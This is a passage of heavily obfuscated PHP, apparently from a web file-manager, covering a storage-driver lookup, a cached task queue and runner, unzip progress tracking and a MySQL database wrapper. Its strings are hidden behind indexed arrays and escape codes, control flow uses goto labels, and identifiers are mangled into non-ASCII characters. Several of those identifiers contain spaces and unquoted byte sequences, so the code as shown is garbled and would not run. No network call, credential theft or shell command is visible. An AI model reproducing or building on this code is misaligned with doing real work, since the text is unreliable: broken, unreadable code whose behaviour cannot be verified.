$GLOBALS[$›ÁÓÜİÂ[1363]]; self::$driverListUser = array_to_keyvalue($ä¾ËéÒí, $›ÁÓÜİÂ[487]); } $Í›‹ÍÀÉ = self::$driverListUser[$İÀÑ¶÷]; break; case KodIO::KOD_SHARE_LINK: $Í›‹ÍÀÉ = array($›ÁÓÜİÂ[1360] => $›ÁÓÜİÂ[1364], $›ÁÓÜİÂ[6] => $Ê¤¹é¬¤); $â¨ììÉ = Action($›ÁÓÜİÂ[1365])->sharePathInfo($Ê¤¹é¬¤[$›ÁÓÜİÂ[87]]); $â¶òÆ¡³ = $â¨ììÉ[$›ÁÓÜİÂ[191]]; if (!$â¨ììÉ[$›ÁÓÜİÂ[191]]) { $âô óÎÔ = Model($›ÁÓÜİÂ[686])->getInfoByHash($Ê¤¹é¬¤[$›ÁÓÜİÂ[487]]); $â¶òÆ¡³ = KodIO::clear($âô óÎÔ[$›ÁÓÜİÂ[583]] . $Ê¤¹é¬¤[$›ÁÓÜİÂ[1358]]); $Ê¤¹é¬¤[$›ÁÓÜİÂ[576]] = $âô óÎÔ; $Ê¤¹é¬¤[$›ÁÓÜİÂ[1339]] = $â¶òÆ¡³; $Í›‹ÍÀÉ = array($›ÁÓÜİÂ[1360] => $›ÁÓÜİÂ[1366], $›ÁÓÜİÂ[6] => $Ê¤¹é¬¤); } else { $Í›‹ÍÀÉ[$›ÁÓÜİÂ[6]][$›ÁÓÜİÂ[1362]] = $â¨ììÉ[$›ÁÓÜİÂ[191]]; } break; case KodIO::KOD_SHARE_ITEM: $Í›‹ÍÀÉ = array($›ÁÓÜİÂ[1360] => $›ÁÓÜİÂ[1367], $›ÁÓÜİÂ[6] => $Ê¤¹é¬¤); $âô óÎÔ = Model($›ÁÓÜİÂ[686])->getInfo($Ê¤¹é¬¤[$›ÁÓÜİÂ[487]]); if ($âô óÎÔ[$›ÁÓÜİÂ[191]] == $›ÁÓÜİÂ[228]) { $â¶òÆ¡³ = KodIO::clear($âô óÎÔ[$›ÁÓÜİÂ[583]] . $Ê¤¹é¬¤[$›ÁÓÜİÂ[1358]]); $Ê¤¹é¬¤[$›ÁÓÜİÂ[576]] = $âô óÎÔ; $Ê¤¹é¬¤[$›ÁÓÜİÂ[1339]] = $â¶òÆ¡³; $Í›‹ÍÀÉ = array($›ÁÓÜİÂ[1360] => $›ÁÓÜİÂ[1368], $›ÁÓÜİÂ[6] => $Ê¤¹é¬¤); } else { if (!$â¶òÆ¡³) { $â¶òÆ¡³ = $âô óÎÔ[$›ÁÓÜİÂ[191]]; } $Í›‹ÍÀÉ[$›ÁÓÜİÂ[6]][$›ÁÓÜİÂ[1362]] = $âô óÎÔ[$›ÁÓÜİÂ[191]]; } break; case KodIO::KOD_SHARE_OUTER: $Í›‹ÍÀÉ = array($›ÁÓÜİÂ[1360] => $›ÁÓÜİÂ[1369], $›ÁÓÜİÂ[6] => $Ê¤¹é¬¤); break; default: $â¶òÆ¡³ = $Ê¤¹é¬¤[$›ÁÓÜİÂ[87]]; $Í›‹ÍÀÉ = array($›ÁÓÜİÂ[1360] => $›ÁÓÜİÂ[1370]); break; } $ƒìÂï˜­ = $Ê¤¹é¬¤[$›ÁÓÜİÂ[87]]; if (!isset(self::$driverCache[$ƒìÂï˜­])) { $›Õê™Şò = strtolower($Í›‹ÍÀÉ[$›ÁÓÜİÂ[96]]); $ã§‚‡¶‚ = $GLOBALS[$›ÁÓÜİÂ[6]][$›ÁÓÜİÂ[92]][$›ÁÓÜİÂ[935]]; $·çÏ¥éï = $›ÁÓÜİÂ[77] . (isset($ã§‚‡¶‚[$›Õê™Şò]) ? $ã§‚‡¶‚[$›Õê™Şò] : ucfirst($›Õê™Şò)); if (!class_exists($·çÏ¥éï)) { show_json("{$·çÏ¥éï}\40\156\x6f\x74\40\145\170\x69\163\164\x73\41", !1); } $ÁßÈÕôÈ = isset($Í›‹ÍÀÉ[$›ÁÓÜİÂ[6]]) ? $Í›‹ÍÀÉ[$›ÁÓÜİÂ[6]] : !1; self::$driverCache[$ƒìÂï˜­] = new $·çÏ¥éï($ÁßÈÕôÈ); } $Çœ–ÁÚ§ = self::$driverCache[$ƒìÂï˜­]; $Çœ–ÁÚ§->pathDriver = $×¹¤ú”¢; $Çœ–ÁÚ§->pathBase = $›ÁÓÜİÂ[12]; if (isset($Í›‹ÍÀÉ[$›ÁÓÜİÂ[6]][$›ÁÓÜİÂ[1371]])) { $Çœ–ÁÚ§->pathBase = rtrim($Í›‹ÍÀÉ[$›ÁÓÜİÂ[6]][$›ÁÓÜİÂ[1371]], $›ÁÓÜİÂ[8]) . $›ÁÓÜİÂ[8]; $â¶òÆ¡³ = $Çœ–ÁÚ§->pathBase . ltrim($â¶òÆ¡³, $›ÁÓÜİÂ[8]); } $â¶òÆ¡³ = $Çœ–ÁÚ§->getPath($â¶òÆ¡³); if (isset($Ê¤¹é¬¤[$›ÁÓÜİÂ[1339]])) { $â¶òÆ¡³ = $Ê¤¹é¬¤[$›ÁÓÜİÂ[1339]]; } $Çœ–ÁÚ§->path = $â¶òÆ¡³; return $Çœ–ÁÚ§; } public static function errorTips($½¹‚õù¾ = false, $óÀÔ¥ß¥ = true) { $Í¤ı ° =& $_SERVER[ïÃ°£«Ê]; static $“‹ÚşãÕ = array(); $ë´‹•©Ğ = 100; if ($½¹‚õù¾ === -1) { return $“‹ÚşãÕ ? $“‹ÚşãÕ[count($“‹ÚşãÕ) - 1] : $Í¤ı °[12]; } if ($½¹‚õù¾ === !1) { return implode($Í¤ı °[285], $“‹ÚşãÕ); } if (count($“‹ÚşãÕ) >= $ë´‹•©Ğ) { $“‹ÚşãÕ = array_slice($“‹ÚşãÕ, $ë´‹•©Ğ * 0.5, $ë´‹•©Ğ); } $“‹ÚşãÕ[] = $½¹‚õù¾; if (!$óÀÔ¥ß¥) { return; } write_log($Í¤ı °[173] . ACTION . $Í¤ı °[1372] . $½¹‚õù¾, $Í¤ı °[1373]); } public static function getLastError($ïÑÕ¼Øå = '') { $‹à‡Ó« = self::errorTips(-1); return $‹à‡Ó« ? $‹à‡Ó« : $ïÑÕ¼Øå; } } goto Eñ¬¤æóÜ·; d™„ä±«ˆ: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\165\x65\x75\145\x4c\145\x6e\147\164\x68"; const QUEUE_DATA = "\x74\141\163\153\121\165\x65\x75\145\x44\x61\164\141"; const QUEUE_TIME = "\x74\x61\x73\153\121\165\145\x75\x65\114\x61\x73\x74\122\165\156"; const QUEUE_THREAD = "\x74\x61\x73\153\x51\165\145\x75\x65\124\x68\x72\145\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($úÍ‰´¥ø, $â¹Òè› = array(), $™î£®ƒß = '', $Ìş‡ËÏ = '') { $¬Ã¿­îà =& $_SERVER[ïÃ°£«Ê]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ìş‡ËÏ && array_find_by_field(self::$listData, $¬Ã¿­îà[95], $Ìş‡ËÏ)) { return !0; } if ($Ìş‡ËÏ && array_find_by_field(self::$listDataAdd, $¬Ã¿­îà[95], $Ìş‡ËÏ)) { return !0; } self::$listDataAdd[] = array($¬Ã¿­îà[342] => $úÍ‰´¥ø, $¬Ã¿­îà[2087] => $â¹Òè›, $¬Ã¿­îà[540] => $™î£®ƒß, $¬Ã¿­îà[95] => $Ìş‡ËÏ); return !0; } public static function addSubmit() { $¨Çã¹’ =& $_SERVER[ïÃ°£«Ê]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($¨Çã¹’[2088] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $¨Çã¹’[12], $¨Çã¹’[540])), $¨Çã¹’[195]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($æ›¢ÖÔ¤, $Ì¤»ä³Õ = array(), $„Šñ¹ÛÚ = '', $­¢†¼¬ü = '') { $·£Úï²œ =& $_SERVER[ïÃ°£«Ê]; if (self::count() >= self::MAX_LENGTH) { return !1; } $¼‚˜¡§ = self::getAll(); if ($­¢†¼¬ü && array_find_by_field($¼‚˜¡§, $·£Úï²œ[95], $­¢†¼¬ü)) { return !0; } $¼‚˜¡§[] = array($·£Úï²œ[342] => $æ›¢ÖÔ¤, $·£Úï²œ[2087] => $Ì¤»ä³Õ, $·£Úï²œ[540] => $„Šñ¹ÛÚ, $·£Úï²œ[95] => $­¢†¼¬ü); self::setAll($¼‚˜¡§); write_log($·£Úï²œ[2088] . $„Šñ¹ÛÚ, $·£Úï²œ[195]); return !0; } public static function run() { $¦¬Ş­œ =& $_SERVER[ïÃ°£«Ê]; $»ÏòæŞ = self::getAll(); $¿‹Ş¢ıû = array_shift($»ÏòæŞ); if (!$¿‹Ş¢ıû) { return !1; } self::setAll($»ÏòæŞ); $‘˜¶¤Îí = timeFloat(); $ã‚—±²° = $¦¬Ş­œ[12]; try { $ã‚—±²° = Hook::apply($¿‹Ş¢ıû[$¦¬Ş­œ[342]], $¿‹Ş¢ıû[$¦¬Ş­œ[2087]]); } catch (Exception $ÙÅÄä÷) { write_log($ÙÅÄä÷, $¦¬Ş­œ[1373]); } $ûç¨ÔÊÊ = number_format(timeFloat() - $‘˜¶¤Îí, 3) . $¦¬Ş­œ[1995]; if ($ã‚—±²° && is_string($ã‚—±²°)) { $ûç¨ÔÊÊ = $ûç¨ÔÊÊ . $¦¬Ş­œ[2089] . $ã‚—±²°; } write_log($¦¬Ş­œ[2090] . $¿‹Ş¢ıû[$¦¬Ş­œ[540]] . $¦¬Ş­œ[2091] . $ûç¨ÔÊÊ, $¦¬Ş­œ[195]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $©ÓŸÜ‹Ê =& $_SERVER[ïÃ°£«Ê]; $Øüí¬•¸ = self::threadCount() + 1; if ($Øüí¬•¸ > 3 || !self::count()) { return; } write_log($©ÓŸÜ‹Ê[2092] . $Øüí¬•¸, $©ÓŸÜ‹Ê[195]); Cache::set(self::QUEUE_THREAD, $Øüí¬•¸, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($©ÓŸÜ‹Ê[2093], $©ÓŸÜ‹Ê[195]); } public static function getKey($±œµ•ø±, $¼Ëİ¸æ¢ = "\x69\156\164") { $Şúª£Õô =& $_SERVER[ïÃ°£«Ê]; Cache::removeMemory($±œµ•ø±); $¾æùÜß­ = Cache::get($±œµ•ø±); if ($¼Ëİ¸æ¢ == $Şúª£Õô[364]) { return $¾æùÜß­ ? intval($¾æùÜß­) : 0; } if ($¼Ëİ¸æ¢ == $Şúª£Õô[2094]) { return is_array($¾æùÜß­) ? $¾æùÜß­ : array(); } return $¾æùÜß­; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ïÃ°£«Ê][2094]); } public static function setAll($­œë»‚©) { $ĞöÚïãŸ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($­œë»‚©), $ĞöÚïãŸ); Cache::set(self::QUEUE_DATA, $­œë»‚©, $ĞöÚïãŸ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ğ¯ä×Æ³, $Îª‰ªÆ¦ = 5.0) { if (!$Ğ¯ä×Æ³) { return; } $“á’ÎÏó = Cache::get($Ğ¯ä×Æ³); if (!$“á’ÎÏó || timeFloat() - floatVal($“á’ÎÏó) >= $Îª‰ªÆ¦) { Cache::set($Ğ¯ä×Æ³, timeFloat(), $Îª‰ªÆ¦ * 10); return !0; } return !1; } public static function timeLimitCall($ÓŞ™Éã, $ËÑ¸öí, $‘‰–ªÑ, $ÁÑâÖ‚‘ = 5.0) { $Ê…æ©²Š =& $_SERVER[ïÃ°£«Ê]; if (!$ÓŞ™Éã || !$ËÑ¸öí) { return; } self::$asyncAdd = !0; $©û…·Ş‹ = $Ê…æ©²Š[2095]; $³ïÑ¥‹ = Cache::get($©û…·Ş‹, !0); $‰‡²ÓĞÁ = array($Ê…æ©²Š[2096] => timeFloat(), $Ê…æ©²Š[2097] => timeFloat(), $Ê…æ©²Š[342] => $ËÑ¸öí, $Ê…æ©²Š[2087] => $‘‰–ªÑ, $Ê…æ©²Š[2098] => $ÁÑâÖ‚‘); if (is_array($³ïÑ¥‹[$ÓŞ™Éã])) { if (timeFloat() - $³ïÑ¥‹[$ÓŞ™Éã][$Ê…æ©²Š[2096]] <= $‰‡²ÓĞÁ[$Ê…æ©²Š[2098]] * 0.5) { return; } $‰‡²ÓĞÁ[$Ê…æ©²Š[2097]] = $³ïÑ¥‹[$ÓŞ™Éã][$Ê…æ©²Š[2097]]; } $³ïÑ¥‹[$ÓŞ™Éã] = $‰‡²ÓĞÁ; Cache::set($©û…·Ş‹, $³ïÑ¥‹, 60); Cache::removeMemory($©û…·Ş‹); write_log($Ê…æ©²Š[2099] . $ÓŞ™Éã . $Ê…æ©²Š[74] . $ËÑ¸öí . $Ê…æ©²Š[2100] . ACTION, $Ê…æ©²Š[195]); } public static function timeLimitCallLoop() { $ÔˆµŒ¦ =& $_SERVER[ïÃ°£«Ê]; $†û¦ôØĞ = array($ÔˆµŒ¦[2101]); $§üéÂî¹ = in_array(strtolower(ACTION), $†û¦ôØĞ); if (!$§üéÂî¹ && !self::$asyncAdd) { return; } $Æ±õÚ¦ş = $ÔˆµŒ¦[2095]; $çüÕ›Ë = Cache::get($Æ±õÚ¦ş, !0); if (!$çüÕ›Ë || count($çüÕ›Ë) <= 0) { return; } $·í¢Ëä = timeFloat(); $Ù°Ô©˜ı = array(); $íÕ©ªî† = array(); foreach ($çüÕ›Ë as $ı½’¢ó¹ => $Â…ìË) { if ($·í¢Ëä - $Â…ìË[$ÔˆµŒ¦[2097]] > $Â…ìË[$ÔˆµŒ¦[2098]]) { $íÕ©ªî†[$ı½’¢ó¹] = $Â…ìË; continue; } $Ù°Ô©˜ı[$ı½’¢ó¹] = $Â…ìË; } if (count($íÕ©ªî†) == 0) { return; } if (count($Ù°Ô©˜ı) == 0) { Cache::remove($Æ±õÚ¦ş); } else { Cache::set($Æ±õÚ¦ş, $Ù°Ô©˜ı, 60); } Cache::removeMemory($Æ±õÚ¦ş); self::runArr($íÕ©ªî†); } public static function finished($“‘¿¯ÙÌ, $—Š»æçñ) { $Õè¿Áñú =& $_SERVER[ïÃ°£«Ê]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Õè¿Áñú[342] => $“‘¿¯ÙÌ, $Õè¿Áñú[2087] => $—Š»æçñ); } private static function runArr($ñÂ¯ö–¸) { $ÚæäÀ˜¶ =& $_SERVER[ïÃ°£«Ê]; if (!$ñÂ¯ö–¸) { return; } foreach ($ñÂ¯ö–¸ as $ö÷¬æ => $üèÚ·“ã) { try { Hook::apply($üèÚ·“ã[$ÚæäÀ˜¶[342]], $üèÚ·“ã[$ÚæäÀ˜¶[2087]]); write_log($ÚæäÀ˜¶[2102] . $ö÷¬æ . $ÚæäÀ˜¶[74] . $üèÚ·“ã[$ÚæäÀ˜¶[342]] . $ÚæäÀ˜¶[2100] . ACTION, $ÚæäÀ˜¶[195]); } catch (Exception $±·ŸàÖƒ) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Û¾¢±Ó  =& $_SERVER[ïÃ°£«Ê]; parent::startAfter(); Hook::bind($Û¾¢±Ó [2103], array($this, $Û¾¢±Ó [2104])); Hook::bind($Û¾¢±Ó [1386], array($this, $Û¾¢±Ó [2105])); Hook::bind($Û¾¢±Ó [2106], array($this, $Û¾¢±Ó [2107])); $åùúºá¿ =& $this->task; $åùúºá¿[$Û¾¢±Ó [2108]] = $Û¾¢±Ó [1387]; if (!$åùúºá¿[$Û¾¢±Ó [1869]]) { $åùúºá¿[$Û¾¢±Ó [1869]] = LNG($Û¾¢±Ó [2109]); } } protected function endAfter() { $îë¹Ø¼‘ =& $_SERVER[ïÃ°£«Ê]; parent::endAfter(); Hook::unbind($îë¹Ø¼‘[2103], array($this, $îë¹Ø¼‘[2104])); Hook::unbind($îë¹Ø¼‘[1386], array($this, $îë¹Ø¼‘[2105])); Hook::unbind($îë¹Ø¼‘[2106], array($this, $îë¹Ø¼‘[2107])); } public function updateAfter() { $õ‘©˜ =& $_SERVER[ïÃ°£«Ê]; $ùšëŸ¸€ =& $this->task; if (!$ùšëŸ¸€[$õ‘©˜[1234]] || !$ùšëŸ¸€[$õ‘©˜[865]]) { if ($ùšëŸ¸€[$õ‘©˜[2108]] != $õ‘©˜[388]) { return; } } if ($ùšëŸ¸€[$õ‘©˜[2108]] == $õ‘©˜[1387]) { $êÎã¢ = 0; if ($ùšëŸ¸€[$õ‘©˜[2033]]) { $êÎã¢ = $ùšëŸ¸€[$õ‘©˜[2034]] / $ùšëŸ¸€[$õ‘©˜[2033]]; } $ùšëŸ¸€[$õ‘©˜[1981]] = $êÎã¢ * 0.3; } else { if ($ùšëŸ¸€[$õ‘©˜[2108]] == $õ‘©˜[388]) { $êÎã¢ = $ùšëŸ¸€[$õ‘©˜[1980]] / $ùšëŸ¸€[$õ‘©˜[1234]]; $ùšëŸ¸€[$õ‘©˜[1981]] = 0.3 + $êÎã¢ * 0.4; } else { if ($ùšëŸ¸€[$õ‘©˜[2108]] == $õ‘©˜[107]) { $Âå± = 0; if ($ùšëŸ¸€[$õ‘©˜[2035]] == $õ‘©˜[107]) { $Âå± = $ùšëŸ¸€[$õ‘©˜[2034]]; } $êÎã¢ = ($ùšëŸ¸€[$õ‘©˜[942]] + $Âå±) / $ùšëŸ¸€[$õ‘©˜[865]]; $ùšëŸ¸€[$õ‘©˜[1981]] = 0.3 + 0.4 + $êÎã¢ * 0.3; } } } if ($ùšëŸ¸€[$õ‘©˜[1981]] > 0) { $¦…µ€²¶ = timeFloat() - $ùšëŸ¸€[$õ‘©˜[1983]] - $ùšëŸ¸€[$õ‘©˜[1986]]; $ùšëŸ¸€[$õ‘©˜[1987]] = $¦…µ€²¶ * (1 - $ùšëŸ¸€[$õ‘©˜[1981]]) / $ùšëŸ¸€[$õ‘©˜[1981]]; } } public function addFile($¬Óˆ‰¶÷) { $’ºÒš® =& $_SERVER[ïÃ°£«Ê]; $¤ÜÔèßù =& $this->task; $¦™í‡¨Ï = IO::info($¬Óˆ‰¶÷); $¤ÜÔèßù[$’ºÒš®[2031]] = $¦™í‡¨Ï[$’ºÒš®[32]]; $¤ÜÔèßù[$’ºÒš®[2033]] = $¦™í‡¨Ï[$’ºÒš®[79]]; $¤ÜÔèßù[$’ºÒš®[2034]] = 0; $¤ÜÔèßù[$’ºÒš®[1236]] = $’ºÒš®[2061]; $¤ÜÔèßù[$’ºÒš®[2035]] = $’ºÒš®[1387]; $¤ÜÔèßù[$’ºÒš®[865]] = $¦™í‡¨Ï[$’ºÒš®[79]]; $¤ÜÔèßù[$’ºÒš®[1234]] = 1; $ÄæÉíƒ‘ = 0; $¤ÜÔèßù[$’ºÒš®[2043]] = array($’ºÒš®[2044] => $ÄæÉíƒ‘ + 1, $’ºÒš®[509] => $¦™í‡¨Ï[$’ºÒš®[32]], $’ºÒš®[87] => $¦™í‡¨Ï[$’ºÒš®[87]], $’ºÒš®[602] => $¦™í‡¨Ï[$’ºÒš®[602]] ? $¦™í‡¨Ï[$’ºÒš®[602]] : $¦™í‡¨Ï[$’ºÒš®[87]]); $this->update(); } public function zipEvent($ÖóŸ˜Ğí, $Ãˆµ²à†, $âÙ’¦âô, $‡£¶«¢©) { $ã™ÆÙìÆ =& $_SERVER[ïÃ°£«Ê]; $‰”£²ŠÖ =& $this->task; $‰”£²ŠÖ[$ã™ÆÙìÆ[2031]] = get_path_this($Ãˆµ²à†); $‰”£²ŠÖ[$ã™ÆÙìÆ[2033]] = $‡£¶«¢©; $‰”£²ŠÖ[$ã™ÆÙìÆ[2034]] = $âÙ’¦âô; $‰”£²ŠÖ[$ã™ÆÙìÆ[1236]] = $ÖóŸ˜Ğí == $ã™ÆÙìÆ[2110] ? $ã™ÆÙìÆ[2111] : $ã™ÆÙìÆ[2112]; $‰”£²ŠÖ[$ã™ÆÙìÆ[2035]] = $ã™ÆÙìÆ[12]; $‰”£²ŠÖ[$ã™ÆÙìÆ[865]] = $‡£¶«¢©; $‰”£²ŠÖ[$ã™ÆÙìÆ[2108]] = $ã™ÆÙìÆ[388]; $this->update(); } public function unzipAfter($­–¬¸¥¡) { $¼‘ş˜ =& $_SERVER[ïÃ°£«Ê]; $Á¡ØšœÛ =& $this->task; $Á¡ØšœÛ[$¼‘ş˜[2108]] = $¼‘ş˜[107]; $‹îıÚ´¢ = IO::infoWithChildren($­–¬¸¥¡); $èì¦¦àÍ = 0; $Á¡ØšœÛ[$¼‘ş˜[2043]] = array($¼‘ş˜[2044] => $èì¦¦àÍ + 1, $¼‘ş˜[509] => $‹îıÚ´¢[$¼‘ş˜[32]], $¼‘ş˜[87] => $‹îıÚ´¢[$¼‘ş˜[87]], $¼‘ş˜[602] => $‹îıÚ´¢[$¼‘ş˜[602]] ? $‹îıÚ´¢[$¼‘ş˜[602]] : $‹îıÚ´¢[$¼‘ş˜[87]]); if ($‹îıÚ´¢[$¼‘ş˜[33]] == $¼‘ş˜[230]) { $Á¡ØšœÛ[$¼‘ş˜[1234]] = 1; } else { $Á¡ØšœÛ[$¼‘ş˜[1234]] = $‹îıÚ´¢[$¼‘ş˜[82]][$¼‘ş˜[80]]; } $Á¡ØšœÛ[$¼‘ş˜[1236]] = $¼‘ş˜[12]; $Á¡ØšœÛ[$¼‘ş˜[2035]] = 0; $Á¡ØšœÛ[$¼‘ş˜[1980]] = 0; $Á¡ØšœÛ[$¼‘ş˜[2033]] = 0; $Á¡ØšœÛ[$¼‘ş˜[2034]] = 0; $Á¡ØšœÛ[$¼‘ş˜[2031]] = $¼‘ş˜[12]; $Á¡ØšœÛ[$¼‘ş˜[942]] = 0; $Á¡ØšœÛ[$¼‘ş˜[865]] = $‹îıÚ´¢[$¼‘ş˜[79]]; $this->update(); self::log($¼‘ş˜[2113] . json_encode(array($Á¡ØšœÛ, $‹îıÚ´¢))); } public function nameParse($¢Ùê¾²) { $¹Ğ²ß¶¡ =& $_SERVER[ïÃ°£«Ê]; $–¢×Î‹× =& $this->task; if ($–¢×Î‹×[$¹Ğ²ß¶¡[2108]] == $¹Ğ²ß¶¡[1387]) { $–¢×Î‹×[$¹Ğ²ß¶¡[2108]] = $¹Ğ²ß¶¡[388]; $–¢×Î‹×[$¹Ğ²ß¶¡[942]] = 0; $–¢×Î‹×[$¹Ğ²ß¶¡[865]] = 0; } $¢å–äËÚ = get_path_this($¢Ùê¾²); if (strstr($¢å–äËÚ, $¹Ğ²ß¶¡[10])) { $–¢×Î‹×[$¹Ğ²ß¶¡[1980]] += 1; $–¢×Î‹×[$¹Ğ²ß¶¡[1234]] += 1; } $–¢×Î‹×[$¹Ğ²ß¶¡[2031]] = $¢Ùê¾²; $this->update(); } } goto C˜âÁÓÈğì; DÛĞâœƒô: class DbMysql extends Db { public function __construct($£üó¥½î = '') { $óÛÕË =& $_SERVER[ïÃ°£«Ê]; if (!extension_loaded($óÛÕË[902])) { think_exception(think_lang($óÛÕË[14]) . $óÛÕË[1047]); } if (!empty($£üó¥½î)) { $this->config = $£üó¥½î; if (empty($this->config[$óÛÕË[17]])) { $this->config[$óÛÕË[17]] = $óÛÕË[12]; } } } public function connect($°®õ©„Ş = '', $°à¶ñ¤Ğ = 0, $´íüƒÚ = false) { $©»‡¡ñ¨ =& $_SERVER[ïÃ°£«Ê]; if (!isset($this->linkID[$°à¶ñ¤Ğ])) { if (empty($°®õ©„Ş)) { $°®õ©„Ş = $this->config; } $ı²½¿“ = $°®õ©„Ş[$©»‡¡ñ¨[1048]] . ($°®õ©„Ş[$©»‡¡ñ¨[1049]] ? "\72{$°®õ©„Ş[$©»‡¡ñ¨[1049]]}" : $©»‡¡ñ¨[12]); $’¹Ê¡áß = !empty($°®õ©„Ş[$©»‡¡ñ¨[17]][$©»‡¡ñ¨[18]]) ? $°®õ©„Ş[$©»‡¡ñ¨[17]][$©»‡¡ñ¨[18]] : $this->pconnect; if ($’¹Ê¡áß) { $this->linkID[$°à¶ñ¤Ğ] = mysql_pconnect($ı²½¿“, $°®õ©„Ş[$©»‡¡ñ¨[1050]], $°®õ©„Ş[$©»‡¡ñ¨[1051]], 131072); } else { $this->linkID[$°à¶ñ¤Ğ] = mysql_connect($ı²½¿“, $°®õ©„Ş[$©»‡¡ñ¨[1050]], $°®õ©„Ş[$©»‡¡ñ¨[1051]], !0, 131072); } if (!$this->linkID[$°à¶ñ¤Ğ] || !empty($°®õ©„Ş[$©»‡¡ñ¨[21]]) && !mysql_select_db($°®õ©„Ş[$©»‡¡ñ¨[21]], $this->linkID[$°à¶ñ¤Ğ])) { think_exception(mysql_error()); } $¢„âë÷° = mysql_get_server_info($this->linkID[$°à¶ñ¤Ğ]); mysql_query($©»‡¡ñ¨[1052] . think_config($©»‡¡ñ¨[1053]) . $©»‡¡ñ¨[58], $this->linkID[$°à¶ñ¤Ğ]); if ($¢„âë÷° > $©»‡¡ñ¨[1054]) { mysql_query($©»‡¡ñ¨[1055], $this->linkID[$°à¶ñ¤Ğ]); } $this->connected = !0; if (1 != think_config($©»‡¡ñ¨[22])) { unset($this->config); } } return $this->linkID[$°à¶ñ¤Ğ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ì´êÜù›) { $¾ğ—Àáí =& $_SERVER[ïÃ°£«Ê]; if (0 === stripos($Ì´êÜù›, $¾ğ—Àáí[342])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ì´êÜù›; if ($this->queryID) { $this->free(); } think_action_status($¾ğ—Àáí[23], 1); think_status($¾ğ—Àáí[24]); $this->queryID = mysql_query($Ì´êÜù›, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($­Õëì˜¶) { $Ê™™á©¨ =& $_SERVER[ïÃ°£«Ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $­Õëì˜¶; if ($this->queryID) { $this->free(); } think_action_status($Ê™™á©¨[25], 1); think_status($Ê™™á©¨[24]); $—ŸÏîÍ½ = mysql_query($­Õëì˜¶, $this->_linkID); $this->debug(); if (!1 === $—ŸÏîÍ½) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ïÃ°£«Ê][1056], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $íë§Áû = mysql_query($_SERVER[ïÃ°£«Ê][1057], $this->_linkID); $this->transTimes = 0; if (!$íë§Áû) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ˆÄœè = mysql_query($_SERVER[ïÃ°£«Ê][1058], $this->_linkID); $this->transTimes = 0; if (!$ˆÄœè) { $this->error(); return !1; } } return !0; } private function getAll() { $Ÿ¹ƒ…ïç = array(); if ($this->numRows > 0) { while ($ªËïšÃÍ = mysql_fetch_assoc($this->queryID)) { $Ÿ¹ƒ…ïç[] = $ªËïšÃÍ; } mysql_data_seek($this->queryID, 0); } return $Ÿ¹ƒ…ïç; } public function getFields($º—‡çÇÕ) { $Íµè“¤è =& $_SERVER[ïÃ°£«Ê]; $÷ÕÅÀ¶„ = $this->query($Íµè“¤è[1059] . $this->parseKey($º—‡çÇÕ)); $¡Í˜Ãê¡ = array(); if ($÷ÕÅÀ¶„) { foreach ($÷ÕÅÀ¶„ as $îİ”Ã¾± => $œÅäíç•) { $¡Í˜Ãê¡[$œÅäíç•[$Íµè“¤è[31]]] = array($Íµè“¤è[32] => $œÅäíç•[$Íµè“¤è[31]], $Íµè“¤è[33] => $œÅäíç•[$Íµè“¤è[34]], $Íµè“¤è[35] => (bool) (strtoupper($œÅäíç•[$Íµè“¤è[36]]) === $Íµè“¤è[1060]), $Íµè“¤è[37] => $œÅäíç•[$Íµè“¤è[38]], $Íµè“¤è[39] => strtolower($œÅäíç•[$Íµè“¤è[40]]) == $Íµè“¤è[41], $Íµè“¤è[42] => strtolower($œÅäíç•[$Íµè“¤è[43]]) == $Íµè“¤è[44]); } } return $¡Í˜Ãê¡; } public function getTables($¨Ğğ…Ü¼ = '') { $Ü ”£°ç =& $_SERVER[ïÃ°£«Ê]; if (!empty($¨Ğğ…Ü¼)) { $õîÎ”İ÷ = $Ü ”£°ç[1061] . $¨Ğğ…Ü¼ . $Ü ”£°ç[1062]; } else { $õîÎ”İ÷ = $Ü ”£°ç[1063]; } $ˆËÈ™ó¯ = $this->query($õîÎ”İ÷); $İñÂÒú = array(); foreach ($ˆËÈ™ó¯ as $ß„ãÍš => $úğı¼í) { $İñÂÒú[$ß„ãÍš] = current($úğı¼í); } return $İñÂÒú; } public function replace($¶ÖÈëÕš, $Úıî®ØŸ = 